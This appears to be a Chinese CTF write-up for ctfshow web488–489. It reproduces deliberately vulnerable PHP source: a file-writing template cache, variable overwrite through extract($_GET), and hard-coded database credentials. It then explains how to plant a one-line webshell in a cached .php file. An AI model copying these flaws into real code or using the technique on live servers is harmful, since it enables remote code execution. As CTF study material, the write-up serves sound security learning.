 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 22:15:24
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

ini_set(&#39;display_errors&#39;, &#39;On&#39;);
include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;
</code></pre>
<p>&#x2F;render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 22:29:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
ini_set(&#39;display_errors&#39;, &#39;On&#39;);

class db&#123;
    

    public static  function getConnection()&#123;
         $username=&#39;root&#39;;
         $password=&#39;root&#39;;
         $port=&#39;3306&#39;;
         $addr=&#39;127.0.0.1&#39;;
         $database=&#39;ctfshow&#39;;
        return new mysqli($addr,$username,$password,$database);
    &#125;

    public static function select_one($sql)&#123;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
&#125;
</code></pre>
<p>&#x2F;render&#x2F;cache_class</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 21:40:10
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
ini_set(&#39;display_errors&#39;, &#39;On&#39;);

class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;

&#125;
</code></pre>
<p>&#x2F;render&#x2F;file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 21:23:28
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

ini_set(&#39;display_errors&#39;, &#39;On&#39;);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>首先我们先把目录结构写好</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102110451.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411102110451"></p>

<p>如果sql注入不可使用的话,就只有file_class.php文件的wrrite方法可以利用了,至于为什么上一关不可利用,我们等会就知道了</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102318520.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411102318520"></p>

<p>我们发现传了两个参数进来,一个是文件名,另一个是文件内容.我们直接转到用例ctrl+b </p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102428030.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411102428030"></p>

<p>发现只有这一处,条件是这个传入的template文件的md5(template)文件不存在,我们接着寻找谁调用了create_cache</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102622460.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411102622460"></p>

<p>也是只有一处,传入了两个参数,一个文件名一个内容,条件是if后面的返回false</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102822927.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411102822927"></p>

<p>也就是这里没有这个md5(template)这个文件,接着回到render_class.php文件</p>
<p>接着往上推,发现内容cache在传入之前先调用了shade方法并且传入了数组,我们先看下面的是将参数进行替换并且替换的是,接着在替换之前有一部读取文件的操作,读取的是初始文件名,不是md5的</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103133848.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103133848"></p>

<p>接着我们去找谁调用了render</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103218434.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103218434"></p>

<p>发现这里总共有四处,第一处仔细观察是无法利用的,因为只要你访问了一次index文件,就会在本地生成md5(index),之后就再也不会能写文件了,而下面两个并没有传入数组参数,这么说的话就没有办法进行替换操作,那么自然也就不能写文件进去,那么只剩下第二个文件了.如果这里能做的话,就只能说明error.php里面存在</p>
<pre><code>&#123;&#123;username&#125;&#125;
</code></pre>
<p>我们来尝试一下,写入以下内容</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103521026.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103521026"></p>

<p>返回index文件进行调试,注意处理一下index文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103553676.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103553676"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103632717.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103632717"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103705971.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103705971"></p>

<p>关键步骤</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103726475.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103726475"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103744290.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103744290"></p>

<p>可见木马写入了这个md5(error)文件里面</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103838783.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411103838783"></p>

<p>接下来我们从题目里面实现一下,照index文件填入</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104009891.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104009891"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104056974.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104056974"></p>

<p>接着访问&#x2F;cache&#x2F;cb5e100e5a9a3e7f6d1fd97512215282.php文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104157508.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104157508"></p>

<p>我们去看一下它error.php的源码,发现和我们想的一样</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104302975.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104302975"></p>

<p>但是不知道你有没有发现一个问题,就是如果我们第一次就直接尝试登录,一个错误的username,就会生成error的md5文件,之后就不能在向里面写文件了</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104517364.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104517364"></p>

<p>我们这样无论怎么发送都不能在写文件了,所以只有一次机会</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104626210.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104626210"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104643730.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411104643730"></p>

<h1 id="web489"><a href="#web489" class="headerlink" title="web489"></a>web489</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 14:20:04
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);



$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    header(&#39;location:index.php?action=login&#39;);
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    $sql = &quot;select id from user where username = &#39;&quot;.md5($username).&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
    extract($_GET);
    $user=db::select_one($sql);
    if($user)&#123;
        templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;);
    &#125;
&#125;

if($action==&#39;clear&#39;)&#123;
    system(&#39;rm -rf cache/*&#39;);
    die(&#39;cache clear&#39;);
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 12:11:43
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;
</code></pre>
<p>render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 12:11:32
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

class db&#123;
    

    public static  function getConnection()&#123;
         $username=&#39;root&#39;;
         $password=&#39;root&#39;;
         $port=&#39;3306&#39;;
         $addr=&#39;127.0.0.1&#39;;
         $database=&#39;ctfshow&#39;;
        return new mysqli($addr,$username,$password,$database);
    &#125;

    public static function select_one($sql)&#123;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
&#125;
</code></pre>
<p>file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 14:08:48
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>&#x2F;render&#x2F;cache_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 12:11:38
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.php&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.php&#39;);
    &#125;

&#125;
</code></pre>
<p>&#x2F;templates&#x2F;index</p>
<pre><code class="php">&lt;!--
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 16:54:39
 Last Modified by:   h1xa
 Last Modified time: 2021-03-08 21:56:49
 email: h1xa@ctfer.com
 link: https://ctfer.com
 path /templates/index.php
--&gt;

&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    欢迎你&#123;&#123;username&#125;&#125;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>这里就解决了上一题的问题了.可以删除文件了,这里还考察了一个点,就是变量覆盖</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125917354.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411125917354"></p>

<p>等到extract()函数解析完成就可以</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125924937.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411125924937"></p>

<p>因此这里就可以直接和上一关一样,先重置sql语句使执行第一个render()接着传入username为一句话</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130153307.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411130153307"></p>

